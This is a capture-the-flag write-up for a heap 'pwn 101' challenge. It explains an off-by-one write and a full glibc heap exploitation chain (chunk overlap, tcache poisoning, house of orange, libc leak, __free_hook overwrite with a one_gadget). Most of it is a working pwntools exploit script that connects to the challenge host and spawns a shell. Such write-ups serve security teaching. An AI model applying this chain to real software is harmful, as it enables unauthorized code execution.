## pwn 101

We have the following action permitted:

 - Show an address: we have three global var in bss that we'll explain just below
  ```
      printf("Phone Number: %d\n", *((_QWORD *)&phone_numbers_list + 3 * v1));
      printf("Name        : %s\n", *((_QWORD *)&nameAddress_list_global_bss + 3 * v1));
      printf("Description : %s\n", description_list[3 * v1]);
  ```

 - Add an address: here we add a new address, by inserting his number in phone_number_list[ 3*i ] that is a integer array.
   then we insert the name of the address that resides in heap ( malloc(0x20) and read(..,0x20) ).
   the last is the description, that resides in heap and is allocated with malloc(length++), and length is signed and must be >=0 and <=0x2000

 - Delete an address: if the index is valid, we free in order, addresse's name, and description, 
   then we set to zero each address indexed in the respective array

The vulnerability is that  we are able to write a description length we declared plus one byte.
  ```
   ..
   description_list[3 * (signed int)i] = malloc(desc_length++);
   ..
   read(0, description_list[3 * (signed int)i], desc_length);
  ```
in this case we should probabily give a try to shrinking chunk, or extending

```
pwndbg> checksec
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Solution

 - use the one-byte to extend the size of the next chunk
 - leak the heap, then free it again and with the overlapping chunk, corrupt the tcachebin to point a chunk that contains the top_chunk->size
 - change the top_chunk size to use house of orange (not the FSOP part)
 - now we can get some unsorted chunk back from malloc, and so leak of the arena
 - and last use again the one-byte to overlap and then again corrupt the tcachebin by inserting __free_hook, then insert one gadget

```
from pwn import *
import time

debug = int(sys.argv[1])
online=False
if( debug == 0):
  r = remote("82.196.10.106", 29099)
  online=True
elif(debug == 1):
  libcz = ELF("/lib/x86_64-linux-gnu/libc.so.6")
  mainz = ELF("./pwn101.elf")
  r = mainz.process()
  if(debug == 2):
    gdb.attach(r, """source ./script.py""") #some breakpoint etc..?

def halt():
  while True:
    log.info( r.recvline() )

def add( length, name, desc):
  r.recvuntil("> ")
  r.sendline('1')
  r.recvuntil("Description Length:")
  r.sendline(str(length))
  r.recvuntil("Phone Number:")
  r.sendline(str(9112223))
  r.recvuntil("Name:")
  r.sendline( name)
  r.recvuntil("Description")
  r.send( desc )

def show( index ):
  r.recvuntil("> ")
  r.sendline('2')
  r.recvuntil("Index:")
  r.sendline( str(index) )

def delete(index):
  r.recvuntil("> ")
  r.sendline('3')
  r.recvuntil("Index:")
  r.sendline(str(index))

def interactive():
  if not online:
    print( """/usr/bin/gdb -q  {0} {1}""".format( r.argv[0], r.pid ) )
  r.interactive()

def exploit(argv):
 #First we need to overlap 
 add(0x88, "Pino", "A"*0x87 + "\n")     #0
 add(0x98, "GG", "B"*0x78 + "\xa1\x00") #1
 add(0x18, "Barrier1", "Barrier2")      #2
 
 #Now that we mapped the chunks we need to use the one-byte 
 delete(0)
 add(0x88, "Pino2", "A"*0x88+ "\xa1")   #0
 delete(1)
 #we get back the overlapping chunk, knowing that we can after corrupt tcache
 add(0x98, "\x0a", "\x0a")              #1

 #now we leak the heap
 show(1)
 r.recvuntil("Description")
 r.recvline()#empty
 heap_leak=u64( ( "\x00" + r.recvline().rstrip() ).ljust(8, "\x00") )
 log.info("leak heap 0x%x" % heap_leak)
 heap_base = heap_leak - 0x1300 #we found on remote is either true
 log.info("heap base address 0x%x" % heap_base)

 #now we can corrupt tcachebin, insert the top_chunk, overwrite his size and use house of orange
 add(0x98, "\x0a", "\x0a")              #3
 add(0x18, "some space", "some space")  #4
 delete(1)
 delete(3)
 heap_top_addr= heap_base + 0x14f0
 heap_top_size= 0x1fb11                 #is the same in remote, we can easyly find it
 heap_new_size= 0xb11
 add(0x98, "\x0a", "A"*0x28 + "B"*0x8 + p64( heap_top_addr ) )  #1
 add(0x98, "\x0a", "here")              #3
 delete(4)
 add(0x98, "\x0a", p64(0x0) + p64(heap_new_size)) #4
 add(0xb10 + 0x300, "still_old_heap", "new_heap_here")  #5
 
 #Leak arena
 add(0x98, "new_heap_here_2", "leaklib\n" ) #6  #we don't require all top because we'll need next
 show(6)
 r.recvuntil("Description")
 r.recvline() #empty
 libc_leak=u64( ( "\x00" + r.recvline().rstrip() ).ljust(8, "\x00") )>>8
 log.info("leak libc 0x%x" % libc_leak)
 libc_base= libc_leak - 0x3dac20 - 0x58
 if online:
   libc_base = libc_leak - 0x3ebc40 - 0x60  #after some guessing we found the right arena offset (the libc wasn't given with the challange)
 log.info("libc base addr 0x%x" % libc_base)
 
 free_hook_offset= 0x3dc8a8
 if online:
   free_hook_offset= 0x3ed8e8

 one_gadget_offset=0xfcc6e
 if online:
   one_gadget_offset=0x4f322

 add(0x88, "h1", "h2")                  #7
 add(0xa8, "h3", "h"*0x68 + p64(0x91))  #8
 delete(7)
 add(0x88, "h1", "A"*0x88 + "\x91")     #7
 delete(8)
 add(0x88, "finaly", "A"*0x28 + p64(0xb1) + p64( libc_base + free_hook_offset ) ) #8

 add(0xa8, "barrier", "barrier")#9
 delete(0)
 add(0xa8, "ok", p64(libc_base + one_gadget_offset) ) #0
 delete(2)
 interactive()
 #$ cat flag.txt
 #ASIS{____fr3E_ho0K_0Of_by_0n3____}

exploit(sys.argv[1:])
```

